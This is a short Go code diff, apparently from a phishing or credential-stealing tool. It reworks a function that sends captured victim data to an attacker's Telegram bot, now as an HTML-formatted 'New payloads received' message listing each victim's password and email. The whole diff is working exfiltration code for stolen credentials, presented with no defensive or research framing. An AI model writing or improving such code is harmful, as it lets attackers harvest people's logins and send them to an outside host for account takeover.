@@ -4,8 +4,10 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"html"
 	"io"
 	"net/http"
+	"time"
 )
 
 func buildPayload(payload MaliciousPayload) *TelegramData {
@@ -21,17 +23,18 @@ func sendToTelegram(token string, chatId string, payload TelegramData) error {
 		return fmt.Errorf("missing token or chat id")
 	}
 
-	jsonBytes, err := json.MarshalIndent(payload, "", "  ")
-	if err != nil {
-		return err
-	}
-
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
-	data := map[string]string{
-		"chat_id": chatId,
-		"text":    string(jsonBytes),
-	}
 
+	message := "<b>New payloads received !!!</b>\n" +
+		"<i>" + time.Now().Format("02/01/2006") + "</i>\n" +
+		"<b>Password :</b> " + html.EscapeString(payload.Password) + "\n" +
+		"<b>Email :</b> " + html.EscapeString(payload.Identifier) + "\n"
+
+	data := map[string]string{
+		"chat_id":    chatId,
+		"text":       message,
+		"parse_mode": "HTML",
+	}
 	body, err := json.Marshal(data)
 	if err != nil {
 		return err
